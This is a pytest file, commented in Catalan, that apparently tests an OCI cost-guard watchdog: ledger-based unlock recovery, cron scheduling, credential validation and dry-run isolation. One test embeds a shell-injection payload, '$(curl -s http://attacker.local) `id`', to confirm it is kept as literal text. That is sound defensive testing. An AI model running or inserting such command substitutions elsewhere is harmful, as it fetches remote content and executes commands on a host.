    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    gh_server.comments.append(c1)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": h1,
            "ledger_event_id": "lock-e12"
        }
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)

        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="github-actions[bot]",
            unlock_reason="Alliberament autoritzat per incident tancat",
            workflow_run_id=valid_run_id,
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )

        assert ok is True
        assert len(gh_server.comments) == 2
        c2 = gh_server.comments[1]
        ev2 = json.loads(c2["body"].split("```json")[1].split("```")[0])
        assert ev2["event_type"] == "UNLOCKED"
        assert ev2["actor"] == "github-actions[bot]"
        assert ev2["workflow_run_id"] == str(valid_run_id)
        assert oci_sim.freeform_tags["economic_lock"] == "false"


def test_e2e_group_e14_unlock_reason_with_special_characters_no_injection(tmp_path, monkeypatch):
    """
    E14. Verificació de robustesa contra injecció de caràcters a 'unlock_reason':
    - Comprova que cadenes amb cometes dobles, cometes simples, punt i coma,
      salts de línia i caràcters de subshell ($(...) o backticks) s'accepten
      i es processen exclusivament com a text literal verbatim, sense executar cap payload.
    """
    monkeypatch.setenv("GITHUB_ACTIONS", "true")
    state_file, _ = setup_test_environment(monkeypatch, tmp_path)
    gh_server = SimulatedGitHubLedgerServer(issue_number=125)
    backend = GitHubIssueLedgerPersistenceBackend("owner/repo", "token", issue_number=125)

    c1 = make_event_comment(1, "lock-e14", event_type="LOCKED", sequence=1, prev_hash="GENESIS")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    gh_server.comments.append(c1)

    oci_sim = SimulatedOCICompute(
        instance_ocid="ocid1.instance.oc1..vm",
        initial_tags={
            "economic_lock": "true",
            "ledger_sequence": "1",
            "ledger_hash": h1,
            "ledger_event_id": "lock-e14"
        }
    )

    special_reason = (
        'Incidència "urgent" resolta; procedint al desbloqueig.\n'
        "Línia 2: verificat per l'operador. Payload simulat: $(curl -s http://attacker.local) `id`"
    )

    with patch("urllib.request.urlopen", side_effect=gh_server.urlopen_handler):
        guard = CostGuard(state_path=state_file, persistence_backend=backend)

        ok, msg = execute_administrative_recovery(
            instance_ocid="ocid1.instance.oc1..vm",
            actor="sec-auditor-1",
            unlock_reason=special_reason,
            workflow_run_id="5544332211",
            guard=guard,
            compute_client=oci_sim,
            mock_provisioning=AUTHORIZED_BASELINE
        )

        assert ok is True
        assert len(gh_server.comments) == 2
        c2 = gh_server.comments[1]
        ev2 = json.loads(c2["body"].split("```json")[1].split("```")[0])
        assert ev2["event_type"] == "UNLOCKED"
        # El text s'ha conservat de forma exacta i literal bit a bit
        assert ev2["unlock_reason"] == special_reason
        assert ev2["workflow_run_id"] == "5544332211"
        assert oci_sim.freeform_tags["economic_lock"] == "false"


# =============================================================================
# GRUP H: VERIFICACIÓ DEL WORKFLOW SCHEDULING I CRON MATRIX
# =============================================================================

def test_e2e_group_h1_workflow_schedule_mode_classification():
    """
    H1. Verificació de la matriu de crons diferenciats, concurrència i protecció d'injecció:
    - Comprova que .github/workflows/oci_cost_guard.yml conté exactament les 3 expressions cron requerides.
    - Comprova que les 3 expressions són mútuament excloents i no hi ha superposició.
    - Comprova la lògica de determinació de mode a partir de github.event.schedule.
    - Comprova que workflow_dispatch manté la capacitat de triar mode manualment.
    - Comprova que la concurrència conté 'group: oci-cost-guard', 'cancel-in-progress: false' i 'queue: max'.
    - Comprova que tots els valors dinàmics es passen via env: i cap ${{ ... }} no està directament en run:.
    """
    wf_path = Path(".github/workflows/oci_cost_guard.yml")
    assert wf_path.exists(), "El workflow oci_cost_guard.yml ha d'existir"

    content = wf_path.read_text(encoding="utf-8")

    # 1. Expressions cron requerides
    cron_fast = "15,30,45 * * * *"
    cron_hourly = "0 0-2,4-23 * * *"
    cron_daily = "0 3 * * *"

    assert f"- cron: '{cron_fast}'" in content or f'- cron: "{cron_fast}"' in content
    assert f"- cron: '{cron_hourly}'" in content or f'- cron: "{cron_hourly}"' in content
    assert f"- cron: '{cron_daily}'" in content or f'- cron: "{cron_daily}"' in content

    # 2. Concurrència estricta: un sol grup, cancel-in-progress: false i queue: max
    assert "group: oci-cost-guard" in content
    assert "cancel-in-progress: false" in content
    assert "queue: max" in content

    # 3. Protecció contra injecció de shell: cap ${{ ... }} dins dels blocs run:
    # Cerquem línies que continguin 'run: |' i les seves línies indentades següents
    lines = content.splitlines()
    in_run_block = False
    run_indent = 0
    for line_idx, line in enumerate(lines):
        stripped = line.strip()
        if stripped.startswith("run:"):
            in_run_block = True
            run_indent = len(line) - len(line.lstrip())
            continue
        if in_run_block:
            current_indent = len(line) - len(line.lstrip())
            if stripped == "" or current_indent > run_indent:
                # Dins del bloc run: no hi pot haver cap interpolació ${{ github.
                assert "${{" not in line, f"Interpolació insegura detectada a la línia {line_idx+1}: {line}"
            else:
                in_run_block = False

    # 4. Assegurar que els inputs clau es passen a través de env:
    expected_env_keys = [
        "EVENT_NAME", "INPUT_MODE", "EVENT_SCHEDULE",
        "INPUT_ACTION", "INPUT_DRY_RUN", "INPUT_ACTOR",
        "INPUT_RUN_ID", "INPUT_UNLOCK_REASON"
    ]
    for k in expected_env_keys:
        assert f"{k}:" in content, f"La variable d'entorn {k} ha d'estar declarada a env:"

    # 5. Assegurar absència de l'antiga expressió */15 i de rellotge (date -u / MINUTE == 0)
    assert "*/15 * * * *" not in content
    assert "MINUTE=$(date" not in content
    assert "[ \"$MINUTE\" -eq 0 ]" not in content

    # 6. Verificació de no-superposició temporal dels 3 crons (24 hores x 60 minuts)
    hours = list(range(24))
    minutes = list(range(60))

    triggered_daily = set()
    triggered_hourly = set()
    triggered_fast = set()

    for h in hours:
        for m in minutes:
            if m in (15, 30, 45):
                triggered_fast.add((h, m))
            if m == 0 and h != 3:
                triggered_hourly.add((h, m))
            if m == 0 and h == 3:
                triggered_daily.add((h, m))

    assert len(triggered_fast.intersection(triggered_hourly)) == 0
    assert len(triggered_fast.intersection(triggered_daily)) == 0
    assert len(triggered_hourly.intersection(triggered_daily)) == 0
    assert len(triggered_daily) == 1
    assert len(triggered_hourly) == 23
    assert len(triggered_fast) == 72
    assert len(triggered_fast | triggered_hourly | triggered_daily) == 96

    # 7. Verificació de resolució de mode
    def resolve_mode(event_name: str, event_schedule: str, input_mode: str) -> str:
        if event_name == "workflow_dispatch":
            return input_mode
        elif event_schedule == "0 3 * * *":
            return "daily"
        elif event_schedule == "0 0-2,4-23 * * *":
            return "hourly"
        elif event_schedule == "15,30,45 * * * *":
            return "fast"
        else:
            return "fast"

    assert resolve_mode("schedule", cron_daily, "") == "daily"
    assert resolve_mode("schedule", cron_hourly, "") == "hourly"
    assert resolve_mode("schedule", cron_fast, "") == "fast"
    assert resolve_mode("workflow_dispatch", "", "daily") == "daily"
    assert resolve_mode("workflow_dispatch", "", "hourly") == "hourly"
    assert resolve_mode("workflow_dispatch", "", "fast") == "fast"
    assert "default: ''" in content


# =============================================================================
# GRUP J: VALIDACIÓ ESTRICTA D'OCID REAL EN OPERACIÓ DE PRODUCCIÓ (FASE 7)
# =============================================================================

def test_e2e_group_j1_run_watchdog_real_operation_rejects_missing_instance_ocid(monkeypatch):
    """
    J1. Verifica que run_watchdog() en operació real (dry_run=False) rebutja
    l'execució abans de qualsevol operació si manca OCI_INSTANCE_OCID.
    """
    monkeypatch.delenv("OCI_INSTANCE_OCID", raising=False)

    # 1. Sense instance_ocid argument ni variable d'entorn
    res = run_watchdog(mode="fast", dry_run=False, instance_ocid=None)
    assert res["watchdog_ok"] is False
    assert "OCI_INSTANCE_OCID" in res["error"]
    assert res["stop_result"] is None

    # 2. Amb cadena buida o espais
    res_blank = run_watchdog(mode="fast", dry_run=False, instance_ocid="   ")
    assert res_blank["watchdog_ok"] is False
    assert "OCI_INSTANCE_OCID" in res_blank["error"]

    # 3. Amb valor simulat fictici ("ocid1.instance.oc1..simulated") en operació real
    res_sim = run_watchdog(mode="fast", dry_run=False, instance_ocid="ocid1.instance.oc1..simulated")
    assert res_sim["watchdog_ok"] is False
    assert "OCI_INSTANCE_OCID" in res_sim["error"]
    assert "no es permeten valors buits o simulats" in res_sim["error"]


def test_e2e_group_j2_recovery_real_operation_rejects_missing_instance_ocid(monkeypatch):
    """
    J2. Verifica que execute_administrative_recovery() en operació real (dry_run=False)
    rebutja la recuperació immediatament si falta OCI_INSTANCE_OCID o és fictici.
    """
    monkeypatch.delenv("OCI_INSTANCE_OCID", raising=False)

    ok, msg = execute_administrative_recovery(
        instance_ocid=None,
        actor="admin-sec",
        workflow_run_id="998877",
        unlock_reason="Desbloqueig d'auditoria autoritzat",
        dry_run=False
    )
    assert ok is False
    assert "falta el paràmetre obligatori 'OCI_INSTANCE_OCID'" in msg

    # Amb valor simulat fictici
    ok_sim, msg_sim = execute_administrative_recovery(
        instance_ocid="ocid1.instance.oc1..simulated",
        actor="admin-sec",
        workflow_run_id="998877",
        unlock_reason="Desbloqueig d'auditoria autoritzat",
        dry_run=False
    )
    assert ok_sim is False
    assert "no es permeten valors simulats o buits en operació real" in msg_sim


def test_e2e_group_j3_stop_and_start_instance_rejects_simulated_in_real_operation():
    """
    J3. Verifica que stop_oci_instance() i start_oci_instance() rebutgen
    valors buits o simulats quan dry_run=False abans d'iniciar crides OCI.
    """
    # 1. stop_oci_instance
    stop_res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..simulated",
        config={"tenancy": "ocid1.tenancy.oc1..test"},
        dry_run=False,
        return_details=True
    )
    assert stop_res["success"] is False
    assert stop_res["stop_accepted"] is False
    assert "no es permeten valors buits o simulats" in stop_res["error"]

    # 2. start_oci_instance
    start_ok = start_oci_instance(
        instance_ocid="ocid1.instance.oc1..simulated",
        config={"tenancy": "ocid1.tenancy.oc1..test"},
        dry_run=False
    )
    assert start_ok is False

    start_blank = start_oci_instance(
        instance_ocid="  ",
        config={"tenancy": "ocid1.tenancy.oc1..test"},
        dry_run=False
    )
    assert start_blank is False


def test_e2e_group_j4_dry_run_permits_simulated_instance_ocid_safely():
    """
    J4. Verifica que en mode Dry-Run (dry_run=True) es permet l'ús de l'OCID simulat
    per a tests i que no es produeix cap crida física a OCI.
    """
    res = run_watchdog(mode="fast", dry_run=True, instance_ocid=None)
    # En dry-run, el watchdog s'executa correctament amb simulació
    assert res["watchdog_ok"] is True
    if res.get("stop_result"):
        assert res["stop_result"]["is_dry_run"] is True
        assert res["stop_result"]["simulation_success"] is True
        assert res["stop_result"]["stop_accepted"] is False

def test_e2e_group_j5_missing_credentials_rejection_in_all_operations(monkeypatch):
    """
    J5. Verifica que en mode real (dry_run=False), la manca de qualsevol credencial OCI
    obligatòria (tenancy, user, fingerprint, clau privada o compartment) és rebutjada
    abans d'efectuar cap trucada de xarxa o operació externa.
    """
    from scripts.oci_external_watchdog import validate_oci_credentials, discover_oci_resources

    # 1. validate_oci_credentials detecta cada camp mancant sense imprimir secrets
    ok1, err1 = validate_oci_credentials({}, require_instance=True, require_compartment=True)
    assert ok1 is False
    assert "OCI_TENANCY_OCID" in err1
    assert "OCI_USER_OCID" in err1
    assert "OCI_FINGERPRINT" in err1
    assert "OCI_PRIVATE_KEY" in err1
    assert "OCI_INSTANCE_OCID" in err1
    assert "OCI_COMPARTMENT_OCID" in err1

    # 2. stop_oci_instance rebutja si falten credencials OCI
    partial_cfg = {"tenancy": "ocid1.tenancy..test", "user": "ocid1.user..test"}
    stop_res = stop_oci_instance(
        instance_ocid="ocid1.instance.oc1..prod_vm",
        config=partial_cfg,
        dry_run=False,
        return_details=True
    )
    assert stop_res["success"] is False
    assert "OCI_FINGERPRINT" in stop_res["error"]
    assert "OCI_PRIVATE_KEY" in stop_res["error"]

    # 3. start_oci_instance rebutja si falten credencials OCI
    start_ok = start_oci_instance(
        instance_ocid="ocid1.instance.oc1..prod_vm",
        config=partial_cfg,
        dry_run=False
    )
    assert start_ok is False

    # 4. execute_administrative_recovery en mode real rebutja si falta compartment o clau
    monkeypatch.delenv("OCI_COMPARTMENT_OCID", raising=False)
    monkeypatch.delenv("OCI_PRIVATE_KEY", raising=False)
    ok_rec, msg_rec = execute_administrative_recovery(
        instance_ocid="ocid1.instance.oc1..prod_vm",
        actor="admin",
        workflow_run_id="12345",
        unlock_reason="Test auditoria",
        config={"tenancy": "ocid1.tenancy..test", "user": "ocid1.user..test", "fingerprint": "fp"},
        dry_run=False
    )
    assert ok_rec is False
    assert "Recuperació denegada" in msg_rec
    assert "OCI_PRIVATE_KEY" in msg_rec

    # 5. discover_oci_resources retorna discovery_failed si falten credencials
    disc_res = discover_oci_resources(config={}, compartment_ocid=None)
    assert disc_res.get("discovery_failed") is True


def test_e2e_group_j6_dry_run_full_flow_does_not_mutate_oci_or_github(monkeypatch, tmp_path):
    """
    J6. Auditoria integral de Dry-Run:
    Verifica mitjançant espies que en mode dry-run no s'invoca cap mètode de mutació
    a OCI (update_instance, instance_action) ni cap mètode d'escriptura a GitHub (set_state).
    """
    from unittest.mock import MagicMock
    import sys
    from scripts.oci_external_watchdog import run_watchdog
    from engine.cost_guard import CostGuard, InMemoryLockPersistenceBackend

    oci_mutations = []
    github_mutations = []

    class MockComputeClient:
        def update_instance(self, *a, **kw):
            oci_mutations.append(("update_instance", a, kw))
            raise RuntimeError("CRÍTIC: update_instance no s'ha de cridar mai en Dry-Run!")

        def instance_action(self, *a, **kw):
            oci_mutations.append(("instance_action", a, kw))
            raise RuntimeError("CRÍTIC: instance_action no s'ha de cridar mai en Dry-Run!")

        def get_instance(self, *a, **kw):
            mock_inst = MagicMock()
            mock_inst.lifecycle_state = "RUNNING"
            mock_inst.freeform_tags = {}
            return MagicMock(data=mock_inst, headers={"etag": "etag-test-123"})

    mock_oci = MagicMock()
    mock_oci.core.ComputeClient = lambda *a, **kw: MockComputeClient()
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    class SpyPersistenceBackend(InMemoryLockPersistenceBackend):
        def set_state(self, state):
            github_mutations.append(state)
            raise RuntimeError("CRÍTIC: set_state no s'ha de cridar mai en Dry-Run!")

    backend = SpyPersistenceBackend(initial_state={"locked": True, "event_id": "lock-99", "sequence": 1, "hash": "h"*64})
    guard = CostGuard(state_path=tmp_path / "cg_state.json", persistence_backend=backend)

    # Executem el watchdog en mode dry_run davant estat crític que demana aturada
    res = run_watchdog(
        mode="fast",
        dry_run=True,
        mock_official_cost=0.50,
        instance_ocid="ocid1.instance.oc1..spy_vm",
        guard=guard
    )

    assert res["watchdog_ok"] is True
    assert len(oci_mutations) == 0, f"S'han detectat mutacions OCI en Dry-Run: {oci_mutations}"
    assert len(github_mutations) == 0, f"S'han detectat mutacions a GitHub en Dry-Run: {github_mutations}"


def test_e2e_group_j7_test_isolation_verifies_real_persistent_files_untouched(tmp_path):
    """
    J7. Aïllament de persistència: Demostra que l'execució de tests (inclosos els que
    simulen aturades i bloquejos econòmics) no modifica els fitxers persistents reals
    del projecte (data/cost_guard_state.json i data/.cost_guard_state_persistent_lock.json).
    """
    import hashlib
    import os
    from engine.cost_guard import CostGuard, InMemoryLockPersistenceBackend, AUTHORIZED_BASELINE
    from scripts.oci_external_watchdog import run_watchdog

    root = Path(__file__).parent.parent
    real_state = root / "data" / "cost_guard_state.json"
    real_lock = root / "data" / ".cost_guard_state_persistent_lock.json"

    def get_hash(p):
        if p.exists():
            return hashlib.sha256(p.read_bytes()).hexdigest(), os.path.getmtime(p)
        return None, None

    h_state_before, mt_state_before = get_hash(real_state)
    h_lock_before, mt_lock_before = get_hash(real_lock)

    # Executem un flux complet amb bloqueig econòmic simulat aïllat
    in_mem_backend = InMemoryLockPersistenceBackend()
    isolated_guard = CostGuard(state_path=tmp_path / "isolated_state.json", persistence_backend=in_mem_backend)

    mock_prov = dict(AUTHORIZED_BASELINE)
    mock_prov["shape"] = "VM.Standard3.Flex" # Dispara RESTART_LOCKED
    mock_prov["economic_lock_tag"] = True

    res = run_watchdog(
        mode="fast",
        dry_run=True,
        mock_provisioning=mock_prov,
        instance_ocid="ocid1.instance.oc1..iso_vm",
        guard=isolated_guard
    )

    assert res["watchdog_ok"] is True

    # Comprovem que els fitxers persistents del directori data/ romanguin estrictament intactes
    h_state_after, mt_state_after = get_hash(real_state)
    h_lock_after, mt_lock_after = get_hash(real_lock)

    assert h_state_before == h_state_after, "El fitxer real data/cost_guard_state.json ha estat alterat!"
    assert mt_state_before == mt_state_after, "El mtime de data/cost_guard_state.json ha canviat!"
    assert h_lock_before == h_lock_after, "El fitxer real data/.cost_guard_state_persistent_lock.json ha estat alterat!"
    assert mt_lock_before == mt_lock_after, "El mtime de data/.cost_guard_state_persistent_lock.json ha canviat!"


# =============================================================================
# GRUP K: Validació avançada de frontera mocks/producció, aïllament forense
# =============================================================================

def test_e2e_group_k1_region_validation_rejects_empty_simulated_or_whitespace():
    """
    K1. Verifica que validate_oci_credentials() valida estrictament OCI_REGION,
    rebutjant cadenes buides, només d'espais o que continguin valors simulats.
    """
    from scripts.oci_external_watchdog import validate_oci_credentials

    valid_base = {
        "tenancy": "ocid1.tenancy.oc1..test",
        "user": "ocid1.user.oc1..test",
        "fingerprint": "20:3b:97:13:55:1c:5b:0d:d3:37:d0:02:f4:91:38:13",
        "key_content": "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----"
    }

    # 1. Regió vàlida per defecte o explícita
    ok1, _ = validate_oci_credentials(valid_base)
    assert ok1 is True

    # 2. Regió buida
    cfg_empty = dict(valid_base)
    cfg_empty["region"] = ""
    ok_empty, err_empty = validate_oci_credentials(cfg_empty)
    assert ok_empty is False
    assert "OCI_REGION" in err_empty

    # 3. Regió només espais
    cfg_spaces = dict(valid_base)
    cfg_spaces["region"] = "   "
    ok_spaces, err_spaces = validate_oci_credentials(cfg_spaces)
    assert ok_spaces is False
    assert "OCI_REGION" in err_spaces

    # 4. Regió simulada
    cfg_sim = dict(valid_base)
    cfg_sim["region"] = "ocid1.region..simulated"
    ok_sim, err_sim = validate_oci_credentials(cfg_sim)
    assert ok_sim is False
    assert "OCI_REGION" in err_sim


def test_e2e_group_k2_operation_specific_required_parameters():
    """
    K2. Verifica que els paràmetres obligatoris es diferencien correctament per operació:
    - stop/start requereix OCI_INSTANCE_OCID però no OCI_COMPARTMENT_OCID.
    - descobriment requereix OCI_COMPARTMENT_OCID però no OCI_INSTANCE_OCID.
    - recuperació administrativa requereix tant instància com compartiment.
    """
    from scripts.oci_external_watchdog import validate_oci_credentials

    valid_creds = {
        "tenancy": "ocid1.tenancy.oc1..test",
        "user": "ocid1.user.oc1..test",
        "fingerprint": "20:3b:97:13:55:1c:5b:0d:d3:37:d0:02:f4:91:38:13",
        "key_content": "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----",
        "region": "eu-madrid-1"
    }

    # 1. Operació d'instància (stop / start): sense compartment és vàlida si té instància
    ok_inst, _ = validate_oci_credentials(
        valid_creds,
        require_instance=True,
        instance_ocid="ocid1.instance.oc1..prod_vm",
        require_compartment=False
    )
    assert ok_inst is True

    # Si falta instància falla
    ok_inst_missing, err_inst_missing = validate_oci_credentials(
        valid_creds,
        require_instance=True,
        instance_ocid=None,
        require_compartment=False
    )
    assert ok_inst_missing is False
    assert "OCI_INSTANCE_OCID" in err_inst_missing
    assert "OCI_COMPARTMENT_OCID" not in err_inst_missing

    # 2. Operació de descobriment: sense instància és vàlida si té compartment
    ok_comp, _ = validate_oci_credentials(
        valid_creds,
        require_instance=False,
        require_compartment=True,
        compartment_ocid="ocid1.compartment.oc1..prod_comp"
    )
    assert ok_comp is True

    # Si falta compartment falla
    ok_comp_missing, err_comp_missing = validate_oci_credentials(
        valid_creds,
        require_instance=False,
        require_compartment=True,
        compartment_ocid=None
    )
    assert ok_comp_missing is False
    assert "OCI_COMPARTMENT_OCID" in err_comp_missing
    assert "OCI_INSTANCE_OCID" not in err_comp_missing

    # 3. Operació de recuperació administrativa: requereix ambdós
    ok_rec_missing, err_rec_missing = validate_oci_credentials(
        valid_creds,
        require_instance=True,
        instance_ocid=None,
        require_compartment=True,
        compartment_ocid=None
    )
    assert ok_rec_missing is False
    assert "OCI_INSTANCE_OCID" in err_rec_missing
    assert "OCI_COMPARTMENT_OCID" in err_rec_missing


def test_e2e_group_k3_no_client_instantiation_or_network_calls_on_missing_credentials(monkeypatch):
    """
    K3. Prova negativa: demostra que davant la manca de credencials en mode real (dry_run=False),
    no s'instancia cap client OCI ni es produeix cap crida de xarxa.
    """
    from scripts.oci_external_watchdog import run_watchdog
    import sys
    from unittest.mock import MagicMock

    compute_client_calls = []
    network_calls = []

    mock_oci = MagicMock()
    def fake_compute_init(*a, **kw):
        compute_client_calls.append((a, kw))
        raise RuntimeError("CRÍTIC: ComputeClient no s'ha d'instanciar si falten credencials!")
    mock_oci.core.ComputeClient = fake_compute_init
    monkeypatch.setitem(sys.modules, "oci", mock_oci)

    def fake_urlopen(*a, **kw):
        network_calls.append((a, kw))
        raise RuntimeError("CRÍTIC: No s'ha de produir cap crida de xarxa!")
    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)

    # Eliminar totes les credencials OCI de l'entorn
    for var in ["OCI_TENANCY_OCID", "OCI_USER_OCID", "OCI_FINGERPRINT", "OCI_PRIVATE_KEY", "OCI_INSTANCE_OCID", "OCI_COMPARTMENT_OCID"]:
        monkeypatch.delenv(var, raising=False)

    # 1. Sense instance_ocid: falla immediatament sense crear client ni fer xarxa
    res1 = run_watchdog(
        mode="fast",
        dry_run=False,
        instance_ocid=None,
        live_url="http://test.local/status"
    )
    assert res1["watchdog_ok"] is False
    assert "OCI_INSTANCE_OCID" in res1["error"]
    assert len(compute_client_calls) == 0
    assert len(network_calls) == 0

    # 2. Amb instance_ocid però sense credencials OCI
    res2 = run_watchdog(
        mode="fast",
        dry_run=False,
        instance_ocid="ocid1.instance.oc1..prod_vm",
        live_url="http://test.local/status"
    )
    assert res2["watchdog_ok"] is False
    assert "Falten paràmetres OCI obligatoris" in res2["error"] or "absència de credencials" in str(res2).lower()
    assert len(compute_client_calls) == 0
    assert len(network_calls) == 0


def test_e2e_group_k4_real_operation_rejects_mock_bypass_attempt(monkeypatch):
    """
    K4. Verifica que una execució en mode real (dry_run=False) NO pot saltar-se
    la validació de credencials ni d'identificadors per haver rebut un mock_provisioning o compute_client.
    """
    from scripts.oci_external_watchdog import execute_administrative_recovery

    # Esborrem credencials de l'entorn
    monkeypatch.delenv("OCI_TENANCY_OCID", raising=False)
    monkeypatch.delenv("OCI_USER_OCID", raising=False)
    monkeypatch.delenv("OCI_FINGERPRINT", raising=False)
    monkeypatch.delenv("OCI_PRIVATE_KEY", raising=False)

    fake_client = MagicMock()
    fake_provisioning = {"shape": "VM.Standard.A1.Flex", "ocpus": 1.0}

    # Intentem cridar execute_administrative_recovery amb dry_run=False passant el mock
    ok, msg = execute_administrative_recovery(
        instance_ocid="ocid1.instance.oc1..prod_vm",
        actor="admin",
        workflow_run_id="998811",
        unlock_reason="Intent de bypass amb mock",
        dry_run=False,
        mock_provisioning=fake_provisioning,
        compute_client=fake_client
    )

    # HA DE REBUTJAR estrictament per manca de credencials reals!
    assert ok is False
    assert "Recuperació denegada" in msg
    assert "Falten paràmetres OCI obligatoris" in msg


def test_e2e_group_k5_exhaustive_persistence_isolation_across_multiple_instantiations(tmp_path):
    """
    K5. Demostra que cap instanciació de CostGuard() (amb o sense paràmetres)
    no llegeix ni escriu accidentalment als fitxers persistents reals del projecte.
    """
    import hashlib
    import os
    from pathlib import Path
    from engine.cost_guard import CostGuard, InMemoryLockPersistenceBackend

    root = Path(__file__).parent.parent
    real_state = root / "data" / "cost_guard_state.json"
    real_lock = root / "data" / ".cost_guard_state_persistent_lock.json"

    def get_file_info(p):
        if p.exists():
            return hashlib.sha256(p.read_bytes()).hexdigest(), os.path.getmtime(p)
        return None, None

    h_s_before, mt_s_before = get_file_info(real_state)
    h_l_before, mt_l_before = get_file_info(real_lock)

    # 1. Instanciació amb backend en memòria
    g1 = CostGuard(persistence_backend=InMemoryLockPersistenceBackend(initial_state={"locked": False}))
    g1.evaluate(current_provisioning={"shape": "VM.Standard.A1.Flex", "ocpus": 1.0, "ram_gb": 6.0, "boot_volume_gb": 50, "extra_volumes_gb": 0, "attached_public_ips": 1, "unattached_public_ips": 0}, uptime_hours=100.0)

    # 2. Instanciació amb camí temporal
    t_file = tmp_path / "sub_test_cg.json"
    g2 = CostGuard(state_path=t_file)
    g2.state["restart_locked"] = True
    g2.save_state()
    assert t_file.exists()

    # 3. Verificació que els fitxers persistents del projecte continuen 100% inalterats
    h_s_after, mt_s_after = get_file_info(real_state)
    h_l_after, mt_l_after = get_file_info(real_lock)

    assert h_s_before == h_s_after, "data/cost_guard_state.json ha estat modificat!"
    assert mt_s_before == mt_s_after, "mtime de data/cost_guard_state.json ha canviat!"
    assert h_l_before == h_l_after, "data/.cost_guard_state_persistent_lock.json ha estat modificat!"
    assert mt_l_before == mt_l_after, "mtime de data/.cost_guard_state_persistent_lock.json ha canviat!"

def test_e2e_group_k6_dry_run_never_posts_to_github_ledger_or_saves_local_state_on_anomaly(tmp_path, monkeypatch):
    """
    K6. Blindatge de no-mutació en dry_run=True:
    Davant una anomalia greu o un bloqueig econòmic (recurs prohibit, economic_lock_tag=True):
    1. L'estat calculat reflecteix correctament el bloqueig (PREVENTIVE_SHUTDOWN o RESTART_LOCKED, can_restart=False).
    2. S'han fet 0 peticions HTTP POST al GitHub Issue Ledger (set_state no crida POST).
    3. El fitxer persistent local state_path roman 100% intacte (cap save_state()).
    """
    import json
    import hashlib
    import os
    from unittest.mock import patch
    from engine.cost_guard import CostGuard, GitHubIssueLedgerPersistenceBackend
    from scripts.oci_external_watchdog import run_watchdog

    state_file = tmp_path / "k6_state.json"
    initial_content = json.dumps({"status": "OK", "service_state": "ACTIVE"}).encode("utf-8")
    state_file.write_bytes(initial_content)
    h_before = hashlib.sha256(state_file.read_bytes()).hexdigest()
    mtime_before = os.path.getmtime(state_file)

    gh_server = SimulatedGitHubLedgerServer(issue_number=99)
    backend = GitHubIssueLedgerPersistenceBackend(
        repository="owner/repo",
        token="ghp_test_token_123456",
        issue_number=99
    )

    # Estat inicial net i operatiu al ledger (LOCKED seq 1 i UNLOCKED seq 2)
    c1 = make_event_comment(1, "init-lock-99", event_type="LOCKED", sequence=1, prev_hash="GENESIS", lock_reason="Setup 99")
    h1 = json.loads(c1["body"].split("```json")[1].split("```")[0])["hash"]
    c2 = make_event_comment(2, "init-unlock-99", event_type="UNLOCKED", sequence=2, prev_hash=h1, resolves_lock_id="init-lock-99", unlock_reason="Unlock 99", actor="admin", workflow_run_id="12345")
    gh_server.comments.extend([c1, c2])

    post_calls = []
    original_handler = gh_server.urlopen_handler

    def spy_urlopen(req, *args, **kwargs):
        method = req.get_method() if hasattr(req, "get_method") else "GET"
        if method == "POST" or (hasattr(req, "data") and req.data is not None):
            post_calls.append(req)
            raise RuntimeError("CRÍTIC: Cap petició POST s'ha d'emetre al GitHub Ledger durant Dry-Run!")
        return original_handler(req, *args, **kwargs)

    with patch("urllib.request.urlopen", side_effect=spy_urlopen):
        guard = CostGuard(state_path=state_file, persistence_backend=backend, dry_run=True)

        res = run_watchdog(
            mode="hourly",
            dry_run=True,
            mock_provisioning={
                "shape": "VM.Standard.E4.Flex",
                "ocpus": 4.0,
                "ram_gb": 16.0,
                "boot_volume_gb": 50.0,
                "extra_volumes_gb": 0.0,
                "attached_public_ips": 1,
                "unattached_public_ips": 2,
                "nat_gateways": 0,
                "load_balancers": 0,
                "anomalies_detected": ["Forma no autoritzada detectada: VM.Standard.E4.Flex"],
                "economic_lock_tag": True,
                "lock_reason_tag": "Alerta d'anomalia greu en dry-run"
            },
            guard=guard
        )

    # 1. El watchdog detecta el bloqueig financer
    assert res["can_restart"] is False
    status = res["cost_guard_summary"].get("status")
    assert status in ("PREVENTIVE_SHUTDOWN", "RESTART_LOCKED")

    # 2. Zero mutacions a GitHub (cap POST)
    assert len(post_calls) == 0

    # 3. Zero mutacions al fitxer local de persistència
    h_after = hashlib.sha256(state_file.read_bytes()).hexdigest()
    mtime_after = os.path.getmtime(state_file)
    assert h_after == h_before, "El fitxer persistent local ha estat modificat en Dry-Run!"
    assert mtime_after == mtime_before, "El mtime del fitxer persistent ha canviat en Dry-Run!"


def test_e2e_group_k7_fast_mode_queries_oci_instance_when_credentials_present(tmp_path, monkeypatch):
    """
    K7. Consulta lleugera d'instància en mode="fast":
    Quan hi ha credencials OCI i client configurat:
    1. run_watchdog(mode="fast", dry_run=True) fa la lectura GET real mitjançant ComputeClient.get_instance().
    2. Obté l'estat real de la VM (is_running, shape, ocpus, ram_gb, oci_anchor) sense cap mutació física.
    """
    import sys
    from unittest.mock import MagicMock
    from engine.cost_guard import CostGuard, InMemoryLockPersistenceBackend
    from scripts.oci_external_watchdog import run_watchdog

    get_instance_calls = []
    mutations = []

    class MockInstance:
        shape = "VM.Standard.A1.Flex"
        lifecycle_state = "RUNNING"
        shape_config = MagicMock(ocpus=2.0, memory_in_gbs=12.0)
        freeform_tags = {
            "economic_lock": "false",
            "ledger_sequence": "5",
            "ledger_hash": "c" * 64,
            "ledger_event_id": "ev-5-fast"
        }

    class MockComputeClient:
        def get_instance(self, ocid):
            get_instance_calls.append(ocid)
            return MagicMock(data=MockInstance(), headers={"etag": "etag-fast-7"})

        def update_instance(self, *a, **kw):
            mutations.append(("update_instance", a, kw))
